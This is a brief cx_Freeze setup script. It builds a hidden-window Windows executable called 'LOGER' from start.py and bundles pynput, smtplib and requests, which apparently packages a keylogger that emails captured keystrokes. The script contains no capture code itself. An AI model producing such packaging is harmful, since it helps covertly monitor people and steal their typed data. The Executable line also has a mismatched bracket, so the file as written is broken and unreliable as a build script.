from cx_Freeze import setup, Executable
import sys

base = None
if (sys.platform == "win32"):
    base = "Win32GUI" 

# executables = [Executable("logger.py", base=base)]

executables = [ Executable('start.py',  base=base]

packages = ["idna", "pynput", "threading", "smtplib", "time", "requests"]
options = {
    'build_exe': {
        'packages': packages,
    },
}

setup(
    name="LOGER",
    options=options,
    version="1.0",
    description='',
    executables=executables, 
)